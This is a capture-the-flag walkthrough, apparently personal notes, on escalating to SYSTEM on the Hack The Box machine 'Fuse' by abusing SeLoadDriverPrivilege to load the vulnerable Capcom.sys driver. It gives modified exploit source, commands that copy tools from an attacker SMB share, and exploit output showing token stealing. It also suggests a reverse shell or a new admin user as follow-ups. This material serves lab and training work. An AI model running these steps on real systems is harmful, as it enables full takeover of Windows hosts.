
# SeLoadDriverPrivilege 

Check with whoami /priv


## Example HTB Fuse

* Capcom.sys - https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver
* EoPLoadDriver.exe - https://github.com/TarlogicSecurity/EoPLoadDriver
* ExploitCapcom.exe - https://github.com/tandasat/ExploitCapcom


You will have to compile the exe's yourself. But it was as easy as opening the cpp files in Visual Studio C++ 2019 (on my Win10 VM) and doing a x64 release build (shortcut for building without executing: CTRL+SHIFT+B ).

You will need to change ExploitCapcom.cpp since by default it will try to open another cmd GUI window with SYSTEM privs. But since we don't have RDP access (only a winrm shell), that won't do.


ExploitCapcom.cpp
```C
/************ Original Code ************/
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))

/************ Changed Code ************/
    if (!CreateProcess(L"C:\\Windows\\system32\\cmd.exe", L"/c \"type c:\\users\\administrator\\Desktop\\root.txt\"", nullptr, nullptr, FALSE,
        0, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
```

Transfer the files to the target and exploit:

```powershell
cd $env:TEMP

copy \\10.10.13.37\EVILSHARE\Capcom.sys
copy \\10.10.13.37\EVILSHARE\EoPLoadDriver64.exe
copy \\10.10.13.37\EVILSHARE\ExploitCapcom64.exe

.\EoPLoadDriver64.exe System\CurrentControlSet\CapcomService C:\Users\svc-print\AppData\Local\Temp\Capcom.sys
.\ExploitCapcom64.exe
```

Expected output:
```powershell
*Evil-WinRM* PS C:\Users\svc-print\AppData\Local\Temp> .\EoPLoadDriver64.exe System\CurrentControlSet\CapcomService C:\Users\svc-print\AppData\Local\Temp\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\CapcomService
NTSTATUS: 00000000, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\AppData\Local\Temp> .\ExploitCapcom64.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 00000241B3EF0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
<flag_printed_here>
```

So the root flag is: `<censored>`

Instead of printing the flag you could execute a reverse shell that you have generated with msfvenom or create a new Admin user. 


